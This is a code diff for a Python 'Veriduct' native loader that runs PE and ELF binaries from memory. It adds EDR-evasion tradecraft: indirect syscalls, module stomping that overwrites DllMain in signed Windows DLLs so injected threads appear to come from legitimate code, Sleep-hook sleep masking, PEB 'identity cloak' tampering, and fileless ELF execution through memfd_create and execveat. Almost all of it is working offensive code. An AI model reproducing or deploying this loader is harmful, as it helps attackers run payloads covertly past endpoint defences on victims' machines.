+                if protection != PAGE_NOACCESS:
+                    if syscall_eng:
+                        success, old_prot = syscall_eng.nt_protect(
+                            section['addr'], section['size'], protection
+                        )
+                        if success:
+                            logging.debug(f"  Section at 0x{section['addr']:X}: -> {protection:#x} [indirect syscall]")
+                        else:
+                            logging.warning(f"  NtProtectVirtualMemory failed for 0x{section['addr']:X}, trying fallback")
+                            old_protect = ctypes.c_ulong()
+                            VirtualProtect(section['addr'], section['size'], protection, ctypes.byref(old_protect))
+                    else:
+                        old_protect = ctypes.c_ulong()
                         success = VirtualProtect(
-                            section['addr'],
-                            section['size'],
-                            protection,
-                            ctypes.byref(old_protect)
+                            section['addr'], section['size'], protection, ctypes.byref(old_protect)
                         )
                         if success:
                             logging.debug(f"  Section at 0x{section['addr']:X}: {old_protect.value:#x} -> {protection:#x}")
                         else:
                             logging.warning(f"  VirtualProtect failed for section at 0x{section['addr']:X}")
-        
-                # Execute
-                entry_addr = base_addr_int + self.entry_point_rva
-                logging.info(f"Jumping to entry point: 0x{entry_addr:X}")
 
-                # Check if this is a DLL or EXE
-                pe_offset = struct.unpack('<I', self.stream[0x3C:0x40])[0]
-                characteristics = struct.unpack('<H', self.stream[pe_offset+22:pe_offset+24])[0]
-                is_dll = bool(characteristics & 0x2000)  # IMAGE_FILE_DLL flag
+            # ==============================================================
+            # EXECUTE
+            # ==============================================================
+            entry_addr = base_addr_int + self.entry_point_rva
+            logging.info(f"Jumping to entry point: 0x{entry_addr:X}")
 
-                if is_dll:
-                    logging.info("Detected DLL - calling with DllMain signature")
-                    # DLL entry point: BOOL WINAPI DllMain(HINSTANCE, DWORD, LPVOID)
-                    ENTRY_FUNC = ctypes.WINFUNCTYPE(
-                        ctypes.c_int,
-                        ctypes.c_void_p,
-                        ctypes.c_ulong,
-                        ctypes.c_void_p
+            # Check if DLL or EXE
+            pe_offset = struct.unpack('<I', self.stream[0x3C:0x40])[0]
+            characteristics = struct.unpack('<H', self.stream[pe_offset+22:pe_offset+24])[0]
+            is_dll = bool(characteristics & 0x2000)
+
+            if is_dll:
+                logging.info("Detected DLL - calling with DllMain signature")
+                ENTRY_FUNC = ctypes.WINFUNCTYPE(
+                    ctypes.c_int, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p
+                )
+                entry = ENTRY_FUNC(entry_addr)
+
+                try:
+                    logging.info(f"Calling DllMain at 0x{entry_addr:X}...")
+                    result = entry(base_addr_int, 1, None)
+                    logging.info(f"DllMain returned: {result}")
+                except Exception as e:
+                    logging.error(f"DllMain crashed: {type(e).__name__}: {e}")
+                    import traceback
+                    traceback.print_exc()
+                    raise
+            else:
+                logging.info("Detected EXE - running in isolated thread")
+                INFINITE = 0xFFFFFFFF
+
+                # ==============================================================
+                # CREATE THREAD (FIX 12: module stomp → indirect syscall → fallback)
+                # ==============================================================
+                h_thread_int = 0
+                stomp_info = None
+
+                # Priority 1: Module stomping — thread origin in disk-backed DLL
+                if syscall_eng:
+                    h_thread_int, stomp_info = self._stomp_module_for_thread(
+                        entry_addr, resolver, syscall_eng
                     )
-                    entry = ENTRY_FUNC(entry_addr)
-                    
-                    try:
-                        logging.info(f"Calling DllMain at 0x{entry_addr:X}...")
-                        result = entry(base_addr_int, 1, None)  # DLL_PROCESS_ATTACH
-                        logging.info(f"DllMain returned: {result}")
-                    except Exception as e:
-                        logging.error(f"DllMain crashed: {type(e).__name__}: {e}")
-                        import traceback
-                        traceback.print_exc()
-                        raise
-                else:
-                    logging.info("Detected EXE - running in isolated thread")
-                    # Run PE in separate thread so ExitThread (hooked from ExitProcess) 
-                    # only kills the PE thread, not our Python host
-                    
+
+                # Priority 2: Direct NtCreateThreadEx (unbacked but indirect syscall)
+                if not h_thread_int and syscall_eng:
+                    h_thread_int = syscall_eng.nt_create_thread(entry_addr)
+                    if h_thread_int:
+                        logging.info(f"PE thread started via NtCreateThreadEx (handle: 0x{h_thread_int:X}) [indirect syscall]")
+                    else:
+                        logging.warning("NtCreateThreadEx failed, falling back to CreateThread")
+
+                # Priority 3: Standard CreateThread (no stealth)
+                if not h_thread_int:
                     if not CreateThread:
                         raise RuntimeError("CreateThread not resolved")
-                    
-                    INFINITE = 0xFFFFFFFF
-                    
-                    logging.info(f"Creating thread at entry point 0x{entry_addr:X}...")
-                    h_thread = CreateThread(
-                        None,           # Default security
-                        0,              # Default stack size  
-                        entry_addr,     # Start at PE entry point
-                        None,           # No parameter
-                        0,              # Run immediately
-                        None            # Don't need thread ID
-                    )
-                    
+                    h_thread = CreateThread(None, 0, entry_addr, None, 0, None)
                     if not h_thread:
                         raise OSError(f"CreateThread failed: {ctypes.get_last_error()}")
-                    
                     h_thread_int = h_thread if isinstance(h_thread, int) else ctypes.cast(h_thread, ctypes.c_void_p).value
-                    logging.info(f"PE thread started (handle: 0x{h_thread_int:X}), waiting for completion...")
-                    
-                    # Wait for PE to finish (will call ExitThread due to our hook)
-                    if WaitForSingleObject:
-                        wait_result = WaitForSingleObject(h_thread_int, INFINITE)
-                    
-                    # Get exit code
-                    exit_code = ctypes.c_ulong(0)
-                    if GetExitCodeThread:
-                        GetExitCodeThread(h_thread_int, ctypes.byref(exit_code))
-                    result = exit_code.value
-                    
-                    # Cleanup
-                    if CloseHandle:
-                        CloseHandle(h_thread_int)
-                    
-                    logging.info(f"PE thread exited with code: {result}")
+                    logging.info(f"PE thread started via CreateThread (handle: 0x{h_thread_int:X})")
 
-                # Restore CRT state (might fail if PEB was corrupted, that's ok)
-                if identity_cloak:
-                    try:
-                        identity_cloak.restore()
-                    except:
-                        pass
+                logging.info("Waiting for PE thread completion...")
+
+                # ==============================================================
+                # WAIT FOR THREAD (indirect syscall or fallback)
+                # ==============================================================
+                if syscall_eng:
+                    wait_status = syscall_eng.nt_wait(h_thread_int, INFINITE)
+                    logging.debug(f"NtWaitForSingleObject returned: 0x{wait_status & 0xFFFFFFFF:08X}")
+                elif WaitForSingleObject:
+                    wait_result = WaitForSingleObject(h_thread_int, INFINITE)
+
+                # Restore stomped DLL bytes now that thread has completed
+                if stomp_info:
+                    self._restore_stomp(stomp_info)
+
+                # Get exit code (no Nt equivalent needed — low-risk call)
+                exit_code = ctypes.c_ulong(0)
+                if GetExitCodeThread:
+                    GetExitCodeThread(h_thread_int, ctypes.byref(exit_code))
+                result = exit_code.value
+
+                # Close thread handle
+                if syscall_eng:
+                    syscall_eng.nt_close(h_thread_int)
+                elif CloseHandle:
+                    CloseHandle(h_thread_int)
+
+                logging.info(f"PE thread exited with code: {result}")
+
+            # ==============================================================
+            # CLEANUP
+            # ==============================================================
+            if identity_cloak:
                 try:
-                    crt_init.restore()
+                    identity_cloak.restore()
                 except:
                     pass
-                
-                # Free all tracked allocations (argv hooks, exit hooks, etc.)
-                self._cleanup_allocations(VirtualFree)
-                
-                # Free the PE memory
+            try:
+                crt_init.restore()
+            except:
+                pass
+
+            self._cleanup_allocations(VirtualFree)
+
+            # Free PE image memory
+            if syscall_eng:
+                syscall_eng.nt_free(base_addr_int)
+            else:
                 try:
-                    VirtualFree(base_addr, 0, 0x8000)  # MEM_RELEASE
+                    VirtualFree(base_addr_int, 0, 0x8000)
                 except:
                     pass
-                    
-                return result
+
+            return result
+
+        except Exception as e:
+            if identity_cloak:
+                try:
+                    identity_cloak.restore()
+                except:
+                    pass
+            try:
+                crt_init.restore()
+            except:
+                pass
+            self._cleanup_allocations(VirtualFree)
             
-            except Exception as e:
-                if identity_cloak:
-                    try:
-                        identity_cloak.restore()
-                    except:
-                        pass
+            # Free PE image memory on error
+            if syscall_eng:
                 try:
-                    crt_init.restore()
+                    syscall_eng.nt_free(base_addr_int)
                 except:
                     pass
-                # Free all tracked allocations on error too
-                self._cleanup_allocations(VirtualFree)
+            else:
                 try:
-                    VirtualFree(base_addr, 0, 0x8000)  # MEM_RELEASE
+                    VirtualFree(base_addr_int, 0, 0x8000)
                 except:
                     pass
-                logging.error(f"PE execution failed: {e}")
-                raise
-    
+            
+            logging.error(f"PE execution failed: {e}")
+            raise
+
     def _cleanup_allocations(self, VirtualFree=None):
         """Free all tracked VirtualAlloc allocations to prevent memory leaks."""
         if not self._allocations:
@@ -2174,7 +3340,7 @@ class VeriductNativeLoader:
         logging.error("Failed to allocate memory for exit hook")
         return None
 
-    def _resolve_pe_imports(self, base_addr, import_rva):
+    def _resolve_pe_imports(self, base_addr, import_rva, sleep_mask=None):
         """
         Walks Import Descriptor, loads DLLs, fills IAT.
         Uses StealthResolver to avoid ctypes.windll telemetry.
@@ -2284,6 +3450,25 @@ class VeriductNativeLoader:
                     elif func_name_bytes == b'__p___argv' and argv_hook:
                         logging.info(f"IAT Hook: Redirecting __p___argv -> 0x{argv_hook:X}")
                         proc_addr = argv_hook
+                    
+
+                    # IAT HOOK: Sleep -> SleepMask callback (annihilation sleep masking)
+                    elif dll_lower == 'kernel32.dll' and func_name_bytes == b'Sleep' and sleep_mask:
+                        sleep_hook_addr = sleep_mask.create_sleep_hook()
+                        if sleep_hook_addr:
+                            logging.info(f"IAT Hook: Redirecting Sleep -> SleepMask @ 0x{sleep_hook_addr:X}")
+                            proc_addr = sleep_hook_addr
+                        else:
+                            proc_addr = GetProcAddress_by_name(h_module_int, func_name_bytes)
+                    
+                    # IAT HOOK: SleepEx -> SleepMask callback
+                    elif dll_lower == 'kernel32.dll' and func_name_bytes == b'SleepEx' and sleep_mask:
+                        sleep_ex_hook_addr = sleep_mask.create_sleep_ex_hook()
+                        if sleep_ex_hook_addr:
+                            logging.info(f"IAT Hook: Redirecting SleepEx -> SleepMask @ 0x{sleep_ex_hook_addr:X}")
+                            proc_addr = sleep_ex_hook_addr
+                        else:
+                            proc_addr = GetProcAddress_by_name(h_module_int, func_name_bytes)
                     
                     else:
                         proc_addr = GetProcAddress_by_name(h_module_int, func_name_bytes)
@@ -2788,168 +3973,393 @@ class VeriductNativeLoader:
 
     def _execute_elf_linux(self):
         """
-        ELF loader using mmap.
-        Handles PT_LOAD segments. Best with static binaries or simple PIE.
-        
-        Includes bounds checking and size validation.
+        ELF loader — memfd_create + fork/execveat.
+
+        Previous approach called _start as a bare CFUNCTYPE(c_int), which gives
+        it a normal C call frame.  glibc's _start strictly expects the kernel's
+        stack layout: argc, argv[], NULL, envp[], NULL, auxv[].  Calling it like
+        a void function pops garbage and segfaults immediately.
+
+        New approach (primary):
+          1. memfd_create  — anonymous in-memory file descriptor
+          2. Write the ELF binary to the memfd
+          3. fork()
+          4. Child: execveat(memfd, "", argv, envp, AT_EMPTY_PATH)
+             The kernel handles stack priming, dynamic linking, PIE ASLR, TLS,
+             init/fini arrays — everything.
+          5. Parent: waitpid()
+
+        Stays fileless (memfd never touches disk).
+
+        Fallback (old kernels without memfd/execveat):
+          Direct mmap + call with a warning.  Only works for static binaries
+          with no CRT dependency on the stack layout (very rare in practice).
+        """
+        # --- Primary path: memfd + fork/exec ---
+        try:
+            return self._execute_elf_via_memfd()
+        except Exception as e:
+            logging.warning(f"memfd/execveat path failed ({e}), trying direct fallback")
+
+        # --- Fallback: direct execution (limited to trivial static binaries) ---
+        logging.warning(
+            "FALLING BACK TO DIRECT ELF EXECUTION.  This will crash on any "
+            "standard glibc-linked binary because _start expects argc/argv/envp/auxv "
+            "on the stack.  Only bare-metal / nostdlib binaries survive this path."
+        )
+        return self._execute_elf_direct_fallback()
+
+    # ------------------------------------------------------------------
+    # Primary ELF path: memfd_create + fork + execveat
+    # ------------------------------------------------------------------
+
+    def _execute_elf_via_memfd(self):
+        """Execute ELF binary through memfd_create + fork/execveat."""
+        import ctypes.util
+        import fcntl
+
+        libc_path = ctypes.util.find_library('c')
+        if not libc_path:
+            raise RuntimeError("Cannot find libc")
+        libc = ctypes.CDLL(libc_path, use_errno=True)
+
+        # --- Step 1: memfd_create ---
+        SYS_memfd_create = 319   # x86_64
+        SYS_execveat     = 322   # x86_64
+        AT_EMPTY_PATH    = 0x1000
+        MFD_CLOEXEC      = 0x0001
+
+        # Try the libc wrapper first; fall back to raw syscall
+        try:
+            libc.memfd_create.restype = ctypes.c_int
+            libc.memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_uint]
+            _memfd_create = libc.memfd_create
+        except AttributeError:
+            _memfd_create = lambda name, flags: libc.syscall(
+                ctypes.c_long(SYS_memfd_create), name, ctypes.c_uint(flags)
+            )
+
+        fd = _memfd_create(b"veriduct", MFD_CLOEXEC)
+        if fd < 0:
+            raise RuntimeError(f"memfd_create failed (errno {ctypes.get_errno()})")
+
+        logging.info(f"memfd created (fd={fd}), writing {len(self.stream)} bytes")
+
+        # --- Step 2: write ELF to memfd ---
+        data = bytes(self.stream)
+        written = 0
+        while written < len(data):
+            chunk = data[written:written + 0x100000]   # 1 MB writes
+            n = os.write(fd, chunk)
+            if n <= 0:
+                os.close(fd)
+                raise RuntimeError(f"write to memfd failed at offset {written}")
+            written += n
+
+        # --- Step 3: build argv ---
+        if self.command_line:
+            args = self.command_line.split()
+        else:
+            args = ["veriduct_payload"]
+
+        logging.info(f"Forking for execveat (argv={args})")
+
+        # --- Step 4: fork ---
+        pid = os.fork()
+
+        if pid == 0:
+            # ====== CHILD ======
+            try:
+                # Clear FD_CLOEXEC so the memfd survives exec
+                flags = fcntl.fcntl(fd, fcntl.F_GETFD)
+                fcntl.fcntl(fd, fcntl.F_SETFD, flags & ~fcntl.FD_CLOEXEC)
+
+                # Build C argv array
+                c_argv_type = ctypes.c_char_p * (len(args) + 1)
+                c_argv = c_argv_type(*(a.encode() for a in args), None)
+
+                # Build C envp array from current environment
+                env_strings = [f"{k}={v}".encode() for k, v in os.environ.items()]
+                c_envp_type = ctypes.c_char_p * (len(env_strings) + 1)
+                c_envp = c_envp_type(*env_strings, None)
+
+                ret = libc.syscall(
+                    ctypes.c_long(SYS_execveat),
+                    ctypes.c_int(fd),
+                    ctypes.c_char_p(b""),
+                    c_argv,
+                    c_envp,
+                    ctypes.c_int(AT_EMPTY_PATH),
+                )
+                # If we reach here, execveat failed
+                os._exit(127)
+            except Exception:
+                os._exit(127)
+
+        # ====== PARENT ======
+        os.close(fd)
+        logging.info(f"Waiting for child PID {pid}...")
+
+        _, status = os.waitpid(pid, 0)
+
+        if os.WIFEXITED(status):
+            code = os.WEXITSTATUS(status)
+            logging.info(f"ELF execution completed (exit code {code})")
+            return code
+        elif os.WIFSIGNALED(status):
+            sig = os.WTERMSIG(status)
+            logging.error(f"ELF process killed by signal {sig}")
+            return -(sig)
+        else:
+            logging.error(f"ELF process ended with unknown status 0x{status:X}")
+            return 1
+
+    # ------------------------------------------------------------------
+    # Fallback ELF path: direct mmap (static binaries only)
+    # ------------------------------------------------------------------
+
+    def _execute_elf_direct_fallback(self):
+        """
+        Direct mmap + CFUNCTYPE call.  Only works for:
+          - Static PIE binaries compiled with -nostdlib
+          - Binaries whose entry point is a normal C function (not glibc _start)
+
+        Standard glibc-linked binaries WILL segfault here because _start
+        expects argc/argv/envp/auxv on the stack.
         """
         import mmap
-        
+
         # Calculate memory requirements
         min_vaddr = 0xFFFFFFFFFFFFFFFF
         max_vaddr = 0
         load_segments = []
-        
+
         for i in range(self.ph_num):
             offset = self.ph_off + (i * self.ph_ent_size)
             p_type = struct.unpack('<I', self.stream[offset:offset+4])[0]
-            
+
             if p_type == 1:  # PT_LOAD
                 p_offset = struct.unpack('<Q', self.stream[offset+8:offset+16])[0]
-                p_vaddr = struct.unpack('<Q', self.stream[offset+16:offset+24])[0]
+                p_vaddr  = struct.unpack('<Q', self.stream[offset+16:offset+24])[0]
                 p_filesz = struct.unpack('<Q', self.stream[offset+32:offset+40])[0]
-                p_memsz = struct.unpack('<Q', self.stream[offset+40:offset+48])[0]
-                p_flags = struct.unpack('<I', self.stream[offset+4:offset+8])[0]
-                
+                p_memsz  = struct.unpack('<Q', self.stream[offset+40:offset+48])[0]
+                p_flags  = struct.unpack('<I', self.stream[offset+4:offset+8])[0]
+
                 if p_vaddr < min_vaddr:
                     min_vaddr = p_vaddr
                 if p_vaddr + p_memsz > max_vaddr:
                     max_vaddr = p_vaddr + p_memsz
-                
-                load_segments.append((p_offset, p_vaddr, p_filesz, p_memsz, p_flags))
-                logging.debug(f"PT_LOAD: VAddr 0x{p_vaddr:X}, FileSz {p_filesz}, MemSz {p_memsz}, Flags {p_flags:#x}")
 
-        # Validate we have segments to load
+                load_segments.append((p_offset, p_vaddr, p_filesz, p_memsz, p_flags))
+                logging.debug(
+                    f"PT_LOAD: VAddr 0x{p_vaddr:X}, FileSz {p_filesz}, "
+                    f"MemSz {p_memsz}, Flags {p_flags:#x}"
+                )
+
         if not load_segments:
             raise RuntimeError("ELF has no PT_LOAD segments")
-        
-        # Validate address range
         if max_vaddr <= min_vaddr:
-            raise RuntimeError(f"Invalid ELF virtual address range: max=0x{max_vaddr:X} <= min=0x{min_vaddr:X}")
+            raise RuntimeError(f"Invalid ELF vaddr range: 0x{min_vaddr:X}–0x{max_vaddr:X}")
 
         total_size = max_vaddr - min_vaddr
-        
-        # Sanity check on size (reject obviously malformed binaries)
-        MAX_REASONABLE_SIZE = 1024 * 1024 * 1024  # 1GB
-        if total_size > MAX_REASONABLE_SIZE:
-            raise RuntimeError(f"ELF image size {total_size} exceeds maximum ({MAX_REASONABLE_SIZE})")
-        
-        # Page align with overflow check
-        total_size_aligned = (total_size + 4095) & ~4095
-        if total_size_aligned < total_size:
-            raise RuntimeError(f"Size overflow during page alignment")
-        total_size = total_size_aligned
-        
-        logging.info(f"Allocating {total_size} bytes for ELF (range: 0x{min_vaddr:X}-0x{max_vaddr:X})")
-        
-        # Allocate memory as RW first (will apply proper protections after loading)
-        mem = mmap.mmap(
-            -1, 
-            total_size, 
-            mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS,
-            mmap.PROT_READ | mmap.PROT_WRITE
+        MAX_REASONABLE = 1024 * 1024 * 1024
+        if total_size > MAX_REASONABLE:
+            raise RuntimeError(f"ELF image size {total_size} exceeds limit ({MAX_REASONABLE})")
+
+        total_size = (total_size + 4095) & ~4095
+        logging.info(
+            f"Allocating {total_size} bytes for ELF "
+            f"(range 0x{min_vaddr:X}–0x{max_vaddr:X})"
         )
-        
+
+        mem = mmap.mmap(
+            -1, total_size,
+            mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS,
+            mmap.PROT_READ | mmap.PROT_WRITE,
+        )
         base_addr = ctypes.addressof(ctypes.c_char.from_buffer(mem))
-        
-        # Store mapped region end for bounds checking in relocations
         self._elf_mapped_end = base_addr + total_size
-        self._elf_mmap = mem  # Keep reference for mprotect
-        
+        self._elf_mmap = mem
+
         logging.info(f"Mapped ELF memory at 0x{base_addr:X}")
-        
-        # Track segments for later mprotect
         segment_protections = []
-        
-        # Load Segments
+
         for p_offset, vaddr, filesz, memsz, p_flags in load_segments:
-            # Handle PIE (position independent) - if vaddr is small, it's relative
             if vaddr < 0x10000000:
                 dest_addr = base_addr + vaddr
                 segment_base = vaddr
             else:
                 dest_addr = vaddr
                 segment_base = vaddr - min_vaddr
-            
-            # BOUNDS CHECK: Ensure segment fits in allocated region
+
             if segment_base + memsz > total_size:
-                raise RuntimeError(f"ELF segment extends beyond allocated region (vaddr=0x{vaddr:X}, memsz=0x{memsz:X})")
-            
-            # BOUNDS CHECK: Ensure we have source data
+                raise RuntimeError(
+                    f"ELF segment beyond allocated region "
+                    f"(vaddr=0x{vaddr:X}, memsz=0x{memsz:X})"
+                )
             if p_offset + filesz > len(self.stream):
-                logging.warning(f"ELF segment source data truncated")
-                filesz = min(filesz, len(self.stream) - p_offset) if p_offset < len(self.stream) else 0
-            
-            # Copy file data
+                filesz = max(0, min(filesz, len(self.stream) - p_offset))
+
             if filesz > 0:
-                data = self.stream[p_offset : p_offset + filesz]
+                data = self.stream[p_offset:p_offset + filesz]
                 ctypes.memmove(dest_addr, bytes(data), len(data))
-            
-            # Zero BSS
             if memsz > filesz:
                 ctypes.memset(dest_addr + filesz, 0, memsz - filesz)
-            
-            # Track for mprotect (page-align the range)
-            page_start = (dest_addr) & ~4095
+
+            page_start = dest_addr & ~4095
             page_end = (dest_addr + memsz + 4095) & ~4095
             segment_protections.append((page_start, page_end - page_start, p_flags))
 
-        # Resolve Dynamic Dependencies
+        # Resolve dynamic dependencies
         if hasattr(self, 'dynamic_entries') and self.dynamic_entries:
             logging.info("Resolving dynamic linking...")
             self._load_elf_dependencies(base_addr)
             self._resolve_elf_relocations(base_addr)
 
-        # Apply proper memory protections (reduce RWX exposure)
+        # Apply memory protections
         try:
-            libc = ctypes.CDLL("libc.so.6", use_errno=True)
-            mprotect = libc.mprotect
-            mprotect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int]
-            mprotect.restype = ctypes.c_int
-            
-            PROT_READ = 0x1
-            PROT_WRITE = 0x2
-            PROT_EXEC = 0x4
-            
+            _libc = ctypes.CDLL("libc.so.6", use_errno=True)
+            _mprotect = _libc.mprotect
+            _mprotect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int]
+            _mprotect.restype = ctypes.c_int
+            PROT_R, PROT_W, PROT_X = 0x1, 0x2, 0x4
+
             for page_start, page_size, p_flags in segment_protections:
                 prot = 0
-                if p_flags & 0x4:  # PF_R
-                    prot |= PROT_READ
-                if p_flags & 0x2:  # PF_W
-                    prot |= PROT_WRITE
-                if p_flags & 0x1:  # PF_X
-                    prot |= PROT_EXEC
-                
-                # Ensure at least read permission
-                if prot == 0:
-                    prot = PROT_READ
-                
-                result = mprotect(page_start, page_size, prot)
-                if result == 0:
-                    logging.debug(f"mprotect 0x{page_start:X} ({page_size} bytes): flags={prot:#x}")
-                else:
-                    logging.warning(f"mprotect failed for 0x{page_start:X}")
-                    
+                if p_flags & 0x4: prot |= PROT_R
+                if p_flags & 0x2: prot |= PROT_W
+                if p_flags & 0x1: prot |= PROT_X
+                if prot == 0: prot = PROT_R
+                _mprotect(page_start, page_size, prot)
         except Exception as e:
-            logging.warning(f"Could not apply segment protections (continuing with RWX): {e}")
-            # Fall back to making everything executable
+            logging.warning(f"mprotect failed ({e}), using RWX fallback")
             try:
-                libc = ctypes.CDLL("libc.so.6")
-                libc.mprotect(base_addr, total_size, 0x7)  # RWX fallback
-            except:
+                _libc = ctypes.CDLL("libc.so.6")
+                _libc.mprotect(base_addr, total_size, 0x7)
+            except Exception:
                 pass
 
-        # Calculate entry point
         real_entry = base_addr + self.entry_point
-        logging.info(f"Jumping to ELF entry point: 0x{real_entry:X}")
-        
-        # Execute
+        logging.info(f"Direct-calling ELF entry 0x{real_entry:X} (WARNING: may crash)")
+
         func_type = ctypes.CFUNCTYPE(ctypes.c_int)
-        func = func_type(real_entry)
-        
-        result = func()
-        logging.info(f"ELF execution completed with return code: {result}")
+        result = func_type(real_entry)()
+        logging.info(f"ELF direct execution returned: {result}")
         return result
+
+    # ------------------------------------------------------------------
+    # Module Stomping — thread starts from legitimate disk-backed code
+    # ------------------------------------------------------------------
+
+    _STOMP_CANDIDATES = [
+        # DLLs that are commonly loaded but whose DllMain is never re-invoked
+        # after initial DLL_PROCESS_ATTACH.  We overwrite the first 12 bytes
+        # of DllMain with a jmp trampoline, create the thread there, then
+        # restore original bytes after completion.
+        "version.dll", "imagehlp.dll", "sfc_os.dll", "apphelp.dll",
+        "gpapi.dll", "cryptbase.dll", "profapi.dll",
+    ]
+
+    def _stomp_module_for_thread(self, entry_addr, resolver, syscall_eng):
+        """
+        Module stomping: create thread from a legitimate DLL address (FIX 12).
+
+        Writes a 12-byte trampoline (mov rax, <entry>; jmp rax) over the
+        DllMain of an already-loaded benign DLL.  The thread's start address
+        is inside a signed, disk-backed module — EDR sees legitimate origin.
+
+        Returns (thread_handle_int, stomp_info) or (0, None) on failure.
+        stomp_info is a dict needed by _restore_stomp to undo the overwrite.
+        """
+        trampoline = b'\x48\xB8' + struct.pack('<Q', entry_addr) + b'\xFF\xE0'
+        tramp_size = len(trampoline)  # 12 bytes
+
+        VirtualProtect_addr = resolver.get_proc_address("kernel32.dll", "VirtualProtect")
+        if not VirtualProtect_addr:
+            return 0, None
+        VirtualProtect = ctypes.WINFUNCTYPE(
+            ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t,
+            ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
+        )(VirtualProtect_addr)
+
+        for dll_name in self._STOMP_CANDIDATES:
+            base = resolver.get_module_base(dll_name)
+            if not base:
+                continue
+
+            try:
+                # Parse PE to find AddressOfEntryPoint (DllMain)
+                pe_off = struct.unpack('<I', ctypes.string_at(base + 0x3C, 4))[0]
+                if ctypes.string_at(base + pe_off, 4) != b'PE\x00\x00':
+                    continue
+                entry_rva = struct.unpack('<I', ctypes.string_at(base + pe_off + 40, 4))[0]
+                if entry_rva == 0:
+                    continue
+
+                stomp_addr = base + entry_rva
+
+                # Save original bytes
+                original_bytes = ctypes.string_at(stomp_addr, tramp_size)
+
+                # Make writable
+                old_prot = ctypes.c_ulong()
+                if not VirtualProtect(stomp_addr, tramp_size, PAGE_READWRITE, ctypes.byref(old_prot)):
+                    continue
+
+                # Write trampoline
+                ctypes.memmove(stomp_addr, trampoline, tramp_size)
+
+                # Restore to original protection (usually RX)
+                VirtualProtect(stomp_addr, tramp_size, old_prot.value, ctypes.byref(old_prot))
+
+                # Create thread from the stomped address
+                h_thread = 0
+                if syscall_eng:
+                    h_thread = syscall_eng.nt_create_thread(stomp_addr)
+
+                if not h_thread:
+                    # Restore and try next candidate
+                    VirtualProtect(stomp_addr, tramp_size, PAGE_READWRITE, ctypes.byref(old_prot))
+                    ctypes.memmove(stomp_addr, original_bytes, tramp_size)
+                    VirtualProtect(stomp_addr, tramp_size, old_prot.value, ctypes.byref(old_prot))
+                    continue
+
+                logging.info(
+                    f"Module stomp: thread @ 0x{stomp_addr:X} "
+                    f"({dll_name}!DllMain+0) [indirect syscall]"
+                )
+
+                stomp_info = {
+                    'addr': stomp_addr,
+                    'original': original_bytes,
+                    'size': tramp_size,
+                    'protect_func': VirtualProtect,
+                }
+                return h_thread, stomp_info
+
+            except Exception as e:
+                logging.debug(f"Module stomp failed for {dll_name}: {e}")
+                continue
+
+        return 0, None
+
+    @staticmethod
+    def _restore_stomp(stomp_info):
+        """Restore original bytes after stomped thread completes."""
+        if not stomp_info:
+            return
+        try:
+            addr = stomp_info['addr']
+            orig = stomp_info['original']
+            size = stomp_info['size']
+            vp = stomp_info['protect_func']
+            old = ctypes.c_ulong()
+            vp(addr, size, PAGE_READWRITE, ctypes.byref(old))
+            ctypes.memmove(addr, orig, size)
+            vp(addr, size, old.value, ctypes.byref(old))
+            logging.debug(f"Module stomp: restored {size} bytes at 0x{addr:X}")
+        except Exception as e:
+            logging.debug(f"Module stomp restore failed: {e}")
 
     def execute_native_direct(self):
         """Execute the native binary."""
@@ -3026,10 +4436,14 @@ class StreamingDisentangler:
         idxs = group["idxs"]
         maxlen = group["maxlen"]
         original_lengths = group["original_lengths"]
-        padding_byte = group.get("padding_byte", 0xFF)
+        padding_seed_b64 = group.get("padding_seed")
+        padding_byte = group.get("padding_byte", 0xFF)  # legacy fallback
         
-        # Pad the entangled chunk
-        padded_chunk = bytearray(entangled_chunk.ljust(maxlen, bytes([padding_byte])))
+        # Pad the entangled chunk (FIX 10)
+        if padding_seed_b64:
+            padded_chunk = bytearray(entangled_chunk[:maxlen].ljust(maxlen, b'\x00'))
+        else:
+            padded_chunk = bytearray(entangled_chunk.ljust(maxlen, bytes([padding_byte])))
         pos_in_group = idxs.index(chunk_idx)
         
         # Start with current chunk
@@ -3042,7 +4456,10 @@ class StreamingDisentangler:
             prev_idx = idxs[i]
             if prev_idx in self.plaintext_cache:
                 prev_chunk = self.plaintext_cache[prev_idx]
-                prev_padded = bytearray(prev_chunk.ljust(maxlen, bytes([padding_byte])))
+                if padding_seed_b64:
+                    prev_padded = bytearray(prev_chunk[:maxlen].ljust(maxlen, b'\x00'))
+                else:
+                    prev_padded = bytearray(prev_chunk.ljust(maxlen, bytes([padding_byte])))
                 for j in range(maxlen):
                     result[j] ^= prev_padded[j]
         
@@ -3129,17 +4546,49 @@ class VeriductExecutionCore:
             logging.error("Invalid binary structure - cannot execute")
 
     def _execute_python(self, data: bytearray):
-            """Execute Python bytecode."""
+            """Execute Python bytecode (FIX 6: dynamic header detection, v2.3)."""
             logging.info("=" * 60)
             logging.info("PYTHON BYTECODE EXECUTION")
             logging.info("=" * 60)
     
             try:
-                # Skip .pyc header (16 bytes for Python 3.7+)
-                if len(data) < 16:
-                    raise ValueError("Bytecode too small")
+                # Determine .pyc header size from magic bytes (FIX 6)
+                # Python 3.0-3.2: 8 bytes  (magic + timestamp)
+                # Python 3.3-3.6: 12 bytes (magic + timestamp + source_size)
+                # Python 3.7+:    16 bytes (magic + flags + timestamp_or_hash + source_size)
+                if len(data) < 4:
+                    raise ValueError("Bytecode too small — not a valid .pyc")
         
-                code_data = bytes(data[16:])
+                pyc_magic = struct.unpack('<H', data[0:2])[0]
+                # Magic numbers: 3000-3099 = Py3.0-3.2, 3100-3199 = 3.3-3.6, 3300+ = 3.7+
+                # Actual magic is (MAGIC_NUMBER).to_bytes(2,'little') — values like 3394, 3413, etc.
+                # More reliable: check if bytes 4-8 look like flags field (3.7+ has bit flags)
+                #
+                # Simplest robust approach: try 16 first (most common), fall back to 12.
+                if len(data) >= 16:
+                    # Check for PEP 552 flags field (3.7+): bytes 4:8 should be 0 or small flags
+                    flags_candidate = struct.unpack('<I', data[4:8])[0]
+                    if flags_candidate <= 0x03:
+                        # Likely 3.7+ (flags field is 0, 1, 2, or 3)
+                        header_size = 16
+                    else:
+                        # Likely 3.3-3.6 (bytes 4:8 are a timestamp, not small flags)
+                        header_size = 12
+                elif len(data) >= 12:
+                    header_size = 12
+                elif len(data) >= 8:
+                    header_size = 8
